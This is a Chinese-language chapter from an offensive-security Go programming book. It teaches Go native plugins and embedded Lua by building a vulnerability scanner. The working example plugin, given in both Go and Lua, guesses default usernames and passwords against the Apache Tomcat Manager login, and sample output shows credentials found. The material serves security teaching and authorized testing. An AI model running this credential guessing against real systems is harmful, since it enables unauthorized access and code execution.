## 第十章：GO 插件与可扩展工具

![Image](img/common.jpg)

许多安全工具都是作为*框架*构建的——核心组件采用一定的抽象级别，允许你轻松扩展其功能。仔细想想，这对于安全从业人员来说是非常有意义的。行业不断变化，社区总是在发明新的漏洞和技术以避免检测，创造了一个高度动态且有些不可预测的环境。然而，通过使用插件和扩展，工具开发人员可以在一定程度上使他们的产品具备应对未来变化的能力。通过重复使用工具的核心组件，而无需繁琐的重写，他们可以通过可插拔系统优雅地应对行业演变。

这种方式，加上广泛的社区参与，可以说是 Metasploit 框架得以成功发展的原因之一。甚至像 Tenable 这样的商业企业也看到了创建可扩展产品的价值；Tenable 依赖于基于插件的系统，在其 Nessus 漏洞扫描器中执行签名检查。

在本章中，你将使用 Go 创建两个漏洞扫描器扩展。首先，你将使用原生的 Go 插件系统，并显式地将代码编译为共享对象。然后，你将通过使用嵌入式 Lua 系统重建相同的插件，而 Lua 系统早于 Go 的原生插件系统。请记住，与在其他语言中创建插件（如 Java 和 Python）不同，Go 中创建插件是一个相对较新的概念。原生支持插件的功能仅从 Go 1.8 版本开始。此外，直到 Go 1.10 版本，你才能将这些插件创建为 Windows 动态链接库（DLL）。确保你正在运行最新版本的 Go，以便本章中的所有示例都能按计划工作。

### 使用 Go 的原生插件系统

在 Go 1.8 版本之前，该语言不支持插件或动态运行时代码扩展性。而像 Java 这样的语言允许你在执行程序时加载一个类或 JAR 文件，从而实例化导入的类型并调用它们的函数，Go 则没有这种奢侈的功能。尽管有时你可以通过接口实现等方式扩展功能，但你无法真正动态加载和执行代码本身。相反，你需要在编译时正确地包含它。例如，无法复制 Java 的功能，如下所示，它动态加载一个类文件，实例化该类，并调用实例上的`someMethod()`方法：

```
File file = new File("/path/to/classes/");
URL[] urls = new URL[]{file.toURL()};
ClassLoader cl = new URLClassLoader(urls);
Class clazz = cl.loadClass("com.example.MyClass");
clazz.getConstructor().newInstance().someMethod();
```

幸运的是，Go 的后续版本具备了模拟这种功能的能力，允许开发人员明确地将代码编译为插件进行使用。然而，仍然存在一些限制。具体来说，在 1.10 版本之前，插件系统仅在 Linux 上有效，因此你需要将可扩展框架部署在 Linux 上。

Go 的插件在构建过程中作为共享对象创建。要生成该共享对象，你输入以下构建命令，并将`plugin`作为`buildmode`选项：

```
$ go build -buildmode=plugin
```

或者，要构建 Windows DLL，可以使用`c-shared`作为`buildmode`选项：

```
$ go build -buildmode=c-shared
```

要构建 Windows DLL，你的程序必须符合一定的约定，以便导出函数，并且还必须导入`C`库。我们将让你自行探索这些细节。在本章中，我们将几乎专注于 Linux 插件变体，因为我们将在第十二章中演示如何加载和使用 DLL。

在你编译成 DLL 或共享对象后，另一个程序可以在运行时加载并使用该插件。任何导出的函数都可以访问。要与共享对象的导出功能交互，你将使用 Go 的`plugin`包。该包的功能是直接的。要使用插件，按照以下步骤操作：

1.  调用`plugin.Open(`filename string`)`打开共享对象文件，并创建一个`*plugin.Plugin`实例。

1.  在`*plugin.Plugin`实例上，调用`Lookup(`symbolName string`)`通过名称检索一个`Symbol`（即导出的变量或函数）。

1.  使用类型断言将通用的`Symbol`转换为程序预期的类型。

1.  根据需要使用转换后的对象。

你可能已经注意到，`Lookup()`的调用要求消费者提供符号名称。这意味着消费者必须有一个预定义的、并且最好是公开的命名方案。可以将其视为几乎定义的 API 或通用接口，插件将被要求遵守。如果没有标准的命名方案，新的插件将需要你修改消费者代码，从而破坏了基于插件的系统的整个目的。

在接下来的示例中，你应该预期插件定义一个名为`New()`的导出函数，该函数返回一个特定的接口类型。这样，你将能够标准化引导过程。获取到接口的句柄可以让我们以可预测的方式调用该对象上的函数。

现在让我们开始创建你的可插拔漏洞扫描器。每个插件将实现自己的签名检查逻辑。你的主扫描程序将通过从文件系统的一个目录中读取插件来引导整个过程。为了让这一切顺利运行，你将有两个独立的仓库：一个用于插件，一个用于消费插件的主程序。

#### 创建主程序

让我们从你的主程序开始，你将把插件附加到它上面。这将帮助你理解编写插件的过程。设置你的仓库目录结构，使其与这里显示的结构相匹配：

```
$ tree
.
--- cmd
    --- scanner
        --- main.go
--- plugins
--- scanner
    --- scanner.go
```

名为 *cmd/scanner/main.go* 的文件是你的命令行工具。它将加载插件并启动扫描。*plugins* 目录将包含你需要动态加载的所有共享对象，用于执行各种漏洞签名检查。你将使用名为 *scanner/scanner.go* 的文件来定义插件和主扫描器所使用的数据类型。你将这些数据放入一个单独的包中，以使其使用起来更为方便。

清单 10-1 显示了你的 *scanner.go* 文件的样子。（所有位于根目录的代码清单都存在于提供的 GitHub 仓库 *[`github.com/blackhat-go/bhg/`](https://github.com/blackhat-go/bhg/)* 中。）

```
   package scanner

   // Scanner defines an interface to which all checks adhere
❶ type Checker interface {
    ❷ Check(host string, port uint64) *Result
   }

   // Result defines the outcome of a check
❸ type Result struct {
       Vulnerable bool
       Details    string
   }
```

*清单 10-1：定义核心扫描器类型 (*[/ch-10/plugin-core/scanner/scanner.go](https://ch-10/plugin-core/scanner/scanner.go)*)*

在这个名为 `scanner` 的包中，你定义了两种类型。第一个是一个名为 `Checker` 的接口 ❶。该接口定义了一个名为 `Check()` ❷ 的方法，该方法接受主机和端口值，并返回指向 `Result` 的指针。你的 `Result` 类型被定义为一个 `struct` ❸。它的作用是追踪检查的结果。服务是否存在漏洞？在记录、验证或利用漏洞时需要哪些详细信息？

你将把接口视为一种契约或蓝图；插件可以自由地实现 `Check()` 函数，方式由其自行决定，只要它返回指向 `Result` 的指针即可。插件的实现逻辑将根据每个插件的漏洞检查逻辑有所不同。例如，检查 Java 反序列化问题的插件可以实现适当的 HTTP 调用，而检查默认 SSH 凭证的插件可以对 SSH 服务发起密码猜测攻击。抽象的力量！

接下来，让我们回顾一下 *cmd/scanner/main.go*，它将使用你的插件（清单 10-2）。

```
const PluginsDir = "../../plugins/" ❶

func main() {
    var (
        files []os.FileInfo
        err   error
        p     *plugin.Plugin
        n     plugin.Symbol
        check scanner.Checker
 res   *scanner.Result
    )  
    if files, err = ioutil.ReadDir(PluginsDir)❷; err != nil {
        log.Fatalln(err)
    }  

    for idx := range files { ❸
        fmt.Println("Found plugin: " + files[idx].Name())
        if p, err = plugin.Open(PluginsDir + "/" + files[idx].Name())❹; err != nil {
            log.Fatalln(err)
        }

        if n, err = p.Lookup("New")❺; err != nil {
            log.Fatalln(err)
        }

        newFunc, ok := n.(func() scanner.Checker) ❻
        if !ok {
            log.Fatalln("Plugin entry point is no good. Expecting: func New() scanner.Checker{ ... }")
        }
        check = newFunc()❼
        res = check.Check("10.0.1.20", 8080) ❽
        if res.Vulnerable { ❾
            log.Println("Host is vulnerable: " + res.Details)
        } else {
            log.Println("Host is NOT vulnerable")
        }
    }  
}
```

*清单 10-2：运行插件的扫描器客户端 (*[/ch-10/plugin-core/cmd/scanner/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-10/plugin-core/cmd/scanner/main.go)*)*

代码首先定义了插件的路径 ❶。在这种情况下，你已经硬编码了它；你当然可以改进代码，使它从参数或环境变量中读取该值。你使用此变量调用 `ioutil.ReadDir(PluginDir)` 获取文件列表 ❷，然后遍历这些插件文件 ❸。对于每个文件，你使用 Go 的 `plugin` 包通过调用 `plugin.Open()` ❹ 来读取插件。如果成功，你将获得一个 `*plugin.Plugin` 实例，并将其分配给名为 `p` 的变量。你调用 `p.Lookup("New")` 来搜索插件中名为 `New` 的符号 ❺。

正如我们在之前的高层概述中提到的，这种符号查找约定要求你的主程序将符号的显式名称作为参数传递，这意味着你期望插件拥有一个同名的导出符号——在这个例子中，我们的主程序正在寻找名为`New`的符号。此外，正如你稍后将看到的，代码期望这个符号是一个函数，它将返回你在上一节中讨论的`scanner.Checker`接口的具体实现。

假设你的插件包含一个名为`New`的符号，你尝试将它转换为类型`func()` `scanner.Checker` ❻。也就是说，你期望这个符号是一个返回实现了`scanner.Checker`的对象的函数。你将转换后的值赋给名为`newFunc`的变量。然后你调用它，并将返回的值赋给名为`check`的变量 ❼。由于你进行了类型断言，你知道`check`满足你的`scanner.Checker`接口，因此它必须实现一个`Check()`函数。你调用它，传入一个目标主机和端口 ❽。结果，一个`*scanner.Result`，被使用名为`res`的变量捕获，并检查是否服务存在漏洞 ❾。

请注意，这个过程是通用的；它使用类型断言和接口来创建一个构造体，允许你动态调用插件。代码中的任何内容都不是特定于单一漏洞签名或用于检查漏洞是否存在的方法。相反，你已经将功能抽象得足够清晰，以至于插件开发者可以创建独立的插件，执行各自的工作单元，而无需了解其他插件——甚至无需深入了解使用应用程序。插件作者唯一需要关注的是正确创建导出的`New()`函数和实现`scanner.Checker`的类型。让我们来看一个做到这一点的插件。

#### 构建一个密码猜测插件

这个插件（清单 10-3）对 Apache Tomcat Manager 登录门户进行密码猜测攻击。这个门户是攻击者的热门目标，通常配置为接受易于猜测的凭证。凭有效凭证，攻击者可以可靠地在底层系统上执行任意代码。这对攻击者来说是一次轻松的胜利。

在我们对代码的回顾中，我们不会涉及漏洞测试的具体细节，因为它实际上只是向特定 URL 发出的一系列 HTTP 请求。相反，我们将主要关注满足插件式扫描器接口要求的部分。

```
import (
    // Some snipped for brevity
    "github.com/bhg/ch-10/plugin-core/scanner" ❶
)

var Users = []string{"admin", "manager", "tomcat"}
var Passwords = []string{"admin", "manager", "tomcat", "password"}

// TomcatChecker implements the scanner.Check interface. Used for guessing Tomcat creds
type TomcatChecker struct{} ❷

// Check attempts to identify guessable Tomcat credentials
func (c *TomcatChecker) Check(host string, port uint64) *scanner.Result { ❸
    var (
        resp   *http.Response
        err    error
        url    string
        res    *scanner.Result
        client *http.Client
        req    *http.Request
    )  
    log.Println("Checking for Tomcat Manager...")
 res = new(scanner.Result) ❹
    url = fmt.Sprintf("http://%s:%d/manager/html", host, port)
    if resp, err = http.Head(url); err != nil {
        log.Printf("HEAD request failed: %s\n", err)
        return res
    }  
    log.Println("Host responded to /manager/html request")
    // Got a response back, check if authentication required
    if resp.StatusCode != http.StatusUnauthorized || resp.Header.Get("WWW-Authenticate") == "" {
        log.Println("Target doesn't appear to require Basic auth.")
        return res
    }  

    // Appears authentication is required. Assuming Tomcat manager. Guess passwords...
    log.Println("Host requires authentication. Proceeding with password guessing...")
    client = new(http.Client)
    if req, err = http.NewRequest("GET", url, nil); err != nil {
        log.Println("Unable to build GET request")
        return res
    }
    for _, user := range Users {
        for _, password := range Passwords {
            req.SetBasicAuth(user, password)
            if resp, err = client.Do(req); err != nil {
                log.Println("Unable to send GET request")
                continue
            }
            if resp.StatusCode == http.StatusOK { ❺
                res.Vulnerable = true
                res.Details = fmt.Sprintf("Valid credentials found - %s:%s", user, password)
                return res
            }  
        }  
    }  
    return res
}

// New is the entry point required by the scanner
func New() scanner.Checker { ❻
    return new(TomcatChecker)
}
```

*清单 10-3：原生创建 Tomcat 凭证猜测插件 (*[/ch-10/plugin-tomcat/main.go](https://github.com/blackhat-go/bhg/tree/master/ch-10/plugin-tomcat/main.go)*)*

首先，你需要导入我们之前详细介绍的`scanner`包 ❶。该包定义了`Checker`接口和你将要构建的`Result`结构体。为了创建`Checker`的实现，你需要定义一个名为`TomcatChecker`的空`struct`类型 ❷。为了满足`Checker`接口的实现要求，你需要创建一个匹配所需函数签名`Check(host string, port uint64) *scanner.Result`的方法 ❸。在这个方法中，你执行所有自定义的漏洞检查逻辑。

由于你需要返回`*scanner.Result`，你先初始化一个，将其赋值给名为`res`的变量 ❹。如果条件满足——也就是说，如果检查器验证了可猜测的凭据——并且漏洞得到确认 ❺，你将`res.Vulnerable`设置为`true`，并将`res.Details`设置为包含已识别凭据的消息。如果未识别出漏洞，返回的实例将保持`res.Vulnerable`的默认状态——`false`。

最后，你需要定义所需的导出函数`New() *scanner.Checker` ❻。这符合扫描器的`Lookup()`调用的预期，同时也满足了类型断言和转换的要求，以实例化插件定义的`TomcatChecker`。这个基本的入口点仅仅是返回一个新的`*TomcatChecker`（由于它实现了所需的`Check()`方法，它恰好是一个`scanner.Checker`）。

#### 运行扫描器

现在，你已经创建了插件和使用它的主程序，编译你的插件，并使用`-o`选项将编译后的共享对象导入到扫描器的插件目录中：

```
$ go build -buildmode=plugin -o /path/to/plugins/tomcat.so
```

然后运行你的扫描器（*cmd/scanner/main.go*），确认它能识别插件、加载插件并执行插件的`Check()`方法：

```
$ go run main.go
Found plugin: tomcat.so
2020/01/15 15:45:18 Checking for Tomcat Manager...
2020/01/15 15:45:18 Host responded to /manager/html request
2020/01/15 15:45:18 Host requires authentication. Proceeding with password guessing...
2020/01/15 15:45:18 Host is vulnerable: Valid credentials found - tomcat:tomcat
```

看看这个？它有效！你的扫描器能够调用插件中的代码。你可以将任意数量的其他插件放入插件目录中。扫描器会尝试读取每个插件并启动漏洞检查功能。

我们开发的代码可以通过一些改进来优化。我们将这些改进留给你作为练习。我们鼓励你尝试以下几项内容：

1.  创建一个插件以检查另一种漏洞。

1.  增加动态提供主机列表及其开放端口的能力，以进行更广泛的测试。

1.  增强代码，仅调用适用的插件。目前，代码会为给定的主机和端口调用所有插件。这并不理想。例如，如果目标端口不是 HTTP 或 HTTPS，你肯定不希望调用 Tomcat 检查器。

1.  将你的插件系统转换为在 Windows 上运行，使用 DLL 作为插件类型。

在下一节中，你将构建相同的漏洞检查插件，但使用一个不同的、非官方的插件系统：Lua。

### 用 Lua 构建插件

在创建可插拔程序时使用 Go 的原生 `buildmode` 特性有一定的局限性，特别是因为它不太具备可移植性，意味着插件可能无法顺利交叉编译。在这一部分，我们将通过使用 Lua 来创建插件，看看如何克服这一缺陷。Lua 是一种用于扩展各种工具的脚本语言。它本身易于嵌入，功能强大、快速且文档完善。像 Nmap 和 Wireshark 这样的安全工具就用它来创建插件，正如你现在将要做的那样。更多信息，请参考官方站点 *[`www.lua.org/`](https://www.lua.org/)*

要在 Go 中使用 Lua，你将使用一个第三方包 `gopher-lua`，它能够直接在 Go 中编译和执行 Lua 脚本。通过输入以下命令安装它：

```
$ go get github.com/yuin/gopher-lua
```

现在，请注意，你为获得可移植性所付出的代价是增加了复杂性。因为 Lua 没有隐式的方式调用你的程序或各种 Go 包中的函数，也不了解你的数据类型。为了解决这个问题，你需要选择两种设计模式中的一种：

1.  在你的 Lua 插件中调用一个单一入口点，并通过其他 Lua 包让插件调用任何辅助方法（例如发起 HTTP 请求所需的方法）。这使得你的主程序简洁，但也降低了可移植性，并可能使依赖管理变得复杂。举个例子，如果一个 Lua 插件需要一个未作为核心 Lua 包安装的第三方依赖呢？当你把插件移到另一个系统时，它就会崩溃。此外，如果两个独立的插件需要不同版本的某个包呢？

1.  在你的主程序中，将辅助函数（如来自 `net/http` 包的函数）封装成一种方式，通过该方式，插件可以进行交互。当然，这要求你编写大量代码以暴露所有 Go 函数和类型。然而，一旦你写完代码，插件就可以以一致的方式重用它。此外，你可以不用太担心使用第一种设计模式时会遇到的 Lua 依赖问题（当然，也有可能插件作者使用了第三方库并导致出现问题）。

在本节的剩余部分，你将使用第二种设计模式。你将封装你的 Go 函数，暴露一个插件可以访问的 façade。这是两种解决方案中更优的一个（而且，*façde* 这个词让它听起来像是你在构建一些非常高端的东西）。

引导和核心的 Go 代码，用于加载和运行插件，在本次练习的整个过程中将保持在一个单一文件中。为了简化起见，我们特意移除了一些在 *[`github.com/yuin/gopher-lua/`](https://github.com/yuin/gopher-lua/)* 示例中使用的模式。我们认为某些模式，比如使用用户定义的类型，使得代码的可读性降低。在实际实现中，你可能会想要包含一些这样的模式，以提高灵活性。同时，你还需要加入更全面的错误和类型检查。

你的主程序将定义用于发出 GET 和 HEAD HTTP 请求的函数，注册这些函数到 Lua 虚拟机（VM），并从指定的插件目录加载并执行 Lua 脚本。你将重建上一节中的 Tomcat 密码猜测插件，这样你就可以对比这两个版本。

#### 创建 head() HTTP 函数

让我们从主程序开始。首先，让我们看一下 `head()` HTTP 函数，它封装了对 Go 的 `net/http` 包的调用（列表 10-4）。

```
func head(l *lua.LState❶) int {
    var (
        host string
        port uint64
        path string
        resp *http.Response
        err  error
        url  string
    )
 ❷ host = l.CheckString(1)
    port = uint64(l.CheckInt64(2))
    path = l.CheckString(3)
    url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
    if resp, err = http.Head(url); err != nil {
     ❸ l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Request failed: %s", err)))
     ❹ return 3
    }
 ❺ l.Push(lua.LNumber(resp.StatusCode))
    l.Push(lua.LBool(resp.Header.Get("WWW-Authenticate") != ""))
    l.Push(lua.LString(""))
 ❻ return 3
}
```

*列表 10-4：为 Lua 创建一个* head() *函数 (*[/ch-10/lua-core/cmd/scanner/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-10/lua-core/cmd/scanner/main.go)*)*

首先，请注意你的 `head()` 函数接受一个指向 `lua.LState` 对象的指针并返回一个 `int` ❶。这是你希望注册到 Lua 虚拟机中的任何函数的预期签名。`lua.LState` 类型维护了虚拟机的运行状态，包括传入 Lua 和从 Go 返回的任何参数，稍后你将看到。由于返回值将包含在 `lua.LState` 实例中，`int` 返回类型表示返回的值的数量。这样，你的 Lua 插件就能够读取并使用这些返回值。

由于 `lua.LState` 对象 `l` 包含传递给你的函数的所有参数，你可以通过调用 `l.CheckString()` 和 `l.CheckInt64()` ❷ 来读取数据。（虽然在我们的示例中不需要，其他 `Check*` 函数也存在，用于处理其他预期的数据类型。）这些函数接收一个整数值，作为期望的参数的索引。与 Go 的切片不同，Lua 使用的是 1 为基的索引。因此，调用 `l.CheckString(1)` 会获取 Lua 函数调用中传入的第一个参数，并期望它是一个字符串。你会为每个预期的参数这样做，传入正确的索引以获取预期的值。对于 `head()` 函数，你期望 Lua 调用 `head(host, port, path)`，其中 `host` 和 `path` 是字符串，`port` 是整数。在更健壮的实现中，你可能需要在这里进行额外的检查，以确保提供的数据有效。

该函数接着发出一个 HTTP HEAD 请求并进行一些错误检查。为了将值返回给 Lua 调用者，你通过调用 `l.Push()` 并传入一个符合 `lua.LValue` 接口类型的对象，将值推送到你的 `lua.LState` 中 ❸。`gopher-lua` 包包含多个实现该接口的类型，使得创建数值和布尔返回类型变得非常简单，例如调用 `lua.LNumber(0)` 和 `lua.LBool(false)`。

在这个例子中，你返回三个值。第一个是 HTTP 状态码，第二个决定服务器是否需要基本认证，第三个是错误消息。如果发生错误，我们选择将状态码设置为 `0`。然后，你返回 `3`，即你推送到 `LState` 实例中的项数 ❹。如果 `http.Head()` 的调用没有产生错误，你将把返回值推送到 `LState` ❺，这次带有有效的状态码，并检查基本认证，最后返回 `3` ❻。

#### 创建 get() 函数

接下来，你将创建 `get()` 函数，类似于之前的示例，它包装了 `net/http` 包的功能。然而，在这个例子中，你将发出一个 HTTP GET 请求。除此之外，`get()` 函数使用的构造与 `head()` 函数非常相似，都是向目标端点发出 HTTP 请求。输入代码见 列表 10-5。

```
func get(l *lua.LState) int {
    var (
        host     string
        port     uint64
        username string
        password string
        path     string
        resp     *http.Response
        err      error
        url      string
        client   *http.Client
        req      *http.Request
    )  
    host = l.CheckString(1)
    port = uint64(l.CheckInt64(2))
 ❶ username = l.CheckString(3)
    password = l.CheckString(4)
    path = l.CheckString(5)
    url = fmt.Sprintf("http://%s:%d/%s", host, port, path)
 client = new(http.Client)
    if req, err = http.NewRequest("GET", url, nil); err != nil {
        l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Unable to build GET request: %s", err)))
        return 3
    }  
    if username != "" || password != "" {
        // Assume Basic Auth is required since user and/or password is set
        req.SetBasicAuth(username, password)
    }  
    if resp, err = client.Do(req); err != nil {
        l.Push(lua.LNumber(0))
        l.Push(lua.LBool(false))
        l.Push(lua.LString(fmt.Sprintf("Unable to send GET request: %s", err)))
        return 3
    }
    l.Push(lua.LNumber(resp.StatusCode))
    l.Push(lua.LBool(false))
    l.Push(lua.LString(""))
    return 3
}
```

*列表 10-5：为 Lua 创建一个* get() *函数（*[/ch-10/lua-core/cmd/scanner/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-10/lua-core/cmd/scanner/main.go)*)*

就像 `head()` 实现一样，`get()` 函数将返回三个值：状态码、一个表示目标系统是否需要基本认证的值，以及任何错误消息。两者之间唯一的实际区别是，`get()` 函数接受两个额外的字符串参数：用户名和密码 ❶。如果这两个值中的任何一个被设置为非空字符串，你将假设需要进行基本认证。

现在，你们中的一些人可能会觉得这些实现非常具体，几乎到了消除插件系统灵活性、可重用性和可移植性的程度。它们几乎是为一个非常特定的用例设计的——即检查基本认证——而不是为了通用目的。毕竟，为什么不返回响应体或 HTTP 头呢？同样，为什么不接受更多的参数来设置 cookies、其他 HTTP 头，或者发送带有请求体的 POST 请求呢？

*简洁性* 是答案。你的实现可以作为构建更强大解决方案的起点。然而，创建该解决方案将是一项更为复杂的工作，而且在尝试解决实现细节时，你很可能会失去代码的初衷。相反，我们选择以一种更基础、更少灵活的方式来处理，从而让一般的、基础的概念更易于理解。改进后的实现可能会暴露出更复杂的用户定义类型，这些类型能够更好地表示例如 `http.Request` 和 `http.Response` 类型的整体。然后，你可以简化函数签名，而不是接受和返回多个参数，减少你接受和返回的参数数量。我们鼓励你通过这个挑战来练习，将代码修改为接受和返回用户定义的 `structs`，而不是基本类型。

#### 注册函数到 Lua 虚拟机

到目前为止，你已经实现了围绕你打算使用的必要`net/http`调用的包装函数，创建了这些函数以便 `gopher-lua` 可以使用它们。然而，你需要实际将这些函数注册到 Lua 虚拟机中。清单 10-6 中的函数集中处理了这个注册过程。

```
❶ const LuaHttpTypeName = "http"

   func register(l *lua.LState) {
    ❷ mt := l.NewTypeMetatable(LuaHttpTypeName)
    ❸ l.SetGlobal("http", mt)
       // static attributes
    ❹ l.SetField(mt, "head", l.NewFunction(head))
       l.SetField(mt, "get", l.NewFunction(get))
   }
```

*清单 10-6：将插件注册到 Lua (*[/ch-10/lua-core/cmd/scanner/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-10/lua-core/cmd/scanner/main.go)*)*

你从定义一个常量开始，该常量将唯一标识你在 Lua 中创建的命名空间 ❶。在这种情况下，你将使用 `http`，因为这本质上是你暴露的功能。在你的 `register()` 函数中，你接受一个指向 `lua.LState` 的指针，并使用该命名空间常量通过调用 `l.NewTypeMetatable()` ❷ 创建一个新的 Lua 类型。你将使用这个元表来跟踪可供 Lua 使用的类型和函数。

然后，你在元表 ❸ 上注册了一个全局名称 `http`。这使得 `http` 隐式包名对 Lua 虚拟机可用。在同一个元表上，你还通过调用 `l.SetField()` ❹ 注册了两个字段。在这里，你定义了两个静态函数，分别命名为 `head()` 和 `get()`，它们可以在 `http` 命名空间下使用。由于它们是静态的，你可以通过 `http.get()` 和 `http.head()` 来调用它们，而无需在 Lua 中创建 `http` 类型的实例。

正如你在 `SetField()` 调用中注意到的，第三个参数是处理 Lua 调用的目标函数。在这种情况下，它们是你之前实现的 `get()` 和 `head()` 函数。这些函数被包装在 `l.NewFunction()` 调用中，它接受一个 `func(*LState) int` 形式的函数，这也是你定义 `get()` 和 `head()` 函数的方式。它们返回一个 `*lua.LFunction`。这可能有点令人困惑，因为我们引入了很多数据类型，并且你可能不熟悉 `gopher-lua`。只需理解，这个函数正在注册全局命名空间和函数名，并在这些函数名和你的 Go 函数之间创建映射。

#### 编写你的主函数

最后，你需要创建 `main()` 函数，它将协调这个注册过程并执行插件 (清单 10-7)。

```
❶ const PluginsDir = "../../plugins"

   func main() {
       var (
           l     *lua.LState
           files []os.FileInfo
           err   error
           f     string
       )
    ❷ l = lua.NewState()
       defer l.Close()
    ❸ register(l)
    ❹ if files, err = ioutil.ReadDir(PluginsDir); err != nil {
           log.Fatalln(err)
       }

    ❺ for idx := range files {
           fmt.Println("Found plugin: " + files[idx].Name())
           f = fmt.Sprintf("%s/%s", PluginsDir, files[idx].Name())
        ❻ if err := l.DoFile(f); err != nil {
               log.Fatalln(err)
           }
       }
   }
```

*清单 10-7：注册和调用 Lua 插件 (*[/ch-10/lua-core/cmd/scanner/main.go](https://github.com/blackhat-go/bhg/blob/master/ch-10/lua-core/cmd/scanner/main.go)*)*

正如你在 Go 示例中的 `main()` 函数那样，你将硬编码加载插件的目录位置 ❶。在你的 `main()` 函数中，你调用 `lua.NewState()` ❷ 来创建一个新的 `*lua.LState` 实例。这个 `lua.NewState()` 实例是你设置 Lua 虚拟机、注册函数和类型、执行任意 Lua 脚本所需的关键项目。然后你将该指针传递给你之前创建的 `register()` 函数 ❸，它会在状态中注册你自定义的 `http` 命名空间和函数。你接着读取插件目录的内容 ❹，并遍历目录中的每个文件 ❺。对于每个文件，你调用 `l.DoFile(f)` ❻，其中 `f` 是文件的绝对路径。此调用会在你注册了自定义类型和函数的 Lua 状态中执行该文件的内容。基本上，`DoFile()` 是 `gopher-lua` 允许你像执行独立的 Lua 脚本一样执行整个文件的方式。

#### 创建你的插件脚本

现在让我们来看看你的 Tomcat 插件脚本，它是用 Lua 编写的 (清单 10-8)。

```
usernames = {"admin", "manager", "tomcat"}
passwords = {"admin", "manager", "tomcat", "password"}

status, basic, err = http.head("10.0.1.20", 8080, "/manager/html") ❶
if err ~= "" then
    print("[!] Error: "..err)
    return
end
if status ~= 401 or not basic then
    print("[!] Error: Endpoint does not require Basic Auth. Exiting.")
    return
end
print("[+] Endpoint requires Basic Auth. Proceeding with password guessing")
for i, username in ipairs(usernames) do
    for j, password in ipairs(passwords) do
        status, basic, err = http.get("10.0.1.20", 8080, username, password, "/manager/html") ❷
        if status == 200 then
            print("[+] Found creds - "..username..":"..password)
            return
        end
    end
end
```

*清单 10-8：Tomcat 密码猜测的 Lua 插件 (*[/ch-10/lua-core/plugins/tomcat.lua](https://github.com/blackhat-go/bhg/blob/master/ch-10/lua-core/plugins/tomcat.lua)*)*

不必太担心漏洞检查的逻辑。它本质上与 Go 版本插件中你创建的逻辑相同；它在使用 HEAD 请求指纹识别应用程序后，针对 Tomcat Manager 门户执行基本的密码猜测。我们突出了两个最有趣的项目。

第一个是对`http.head("10.0.1.20", 8080, "/manager/html")`的调用❶。根据你在状态元表上的全局和字段注册，你可以调用名为`http.head()`的函数而不会收到 Lua 错误。此外，你向调用中传递了`head()`函数从`LState`实例中读取的三个参数。Lua 调用期望三个返回值，这与在退出 Go 函数之前推送到`LState`上的数字和类型相匹配。

第二项是对`http.get()`的调用❷，这与`http.head()`函数调用类似。唯一的真正区别是你传递了用户名和密码参数给`http.get()`函数。如果你回顾一下`get()`函数的 Go 实现，你会发现我们从`LState`实例中读取了这两个附加的字符串。

#### 测试 Lua 插件

这个例子并不完美，还可以通过更多的设计考虑来改进。但和大多数对抗工具一样，最重要的是它能工作并解决问题。运行你的代码证明它确实按预期工作：

```
$ go run main.go
Found plugin: tomcat.lua
[+] Endpoint requires Basic Auth. Proceeding with password guessing
[+] Found creds - tomcat:tomcat
```

现在你已经有了一个基本的工作示例，我们鼓励你通过实现用户定义的类型来改进设计，这样你就不会在函数之间传递冗长的参数和参数列表了。这样，你可能需要探索在结构体上注册实例方法，无论是为了在 Lua 中设置和获取值，还是为了在特定实现的实例上调用方法。在此过程中，你会注意到你的代码会变得显著复杂，因为你会以 Lua 友好的方式封装大量 Go 的功能。

### 总结

就像许多设计决策一样，总有多种方法可以实现目标。无论是使用 Go 的本地插件系统，还是像 Lua 这样的替代语言，你都必须考虑权衡。无论你采取哪种方法，你都可以轻松扩展 Go 来构建丰富的安全框架，特别是自从其本地插件系统的加入之后。

在下一章中，你将深入探讨密码学这一丰富的话题。我们将展示各种实现和使用案例，然后构建一个 RC2 对称密钥暴力破解工具。
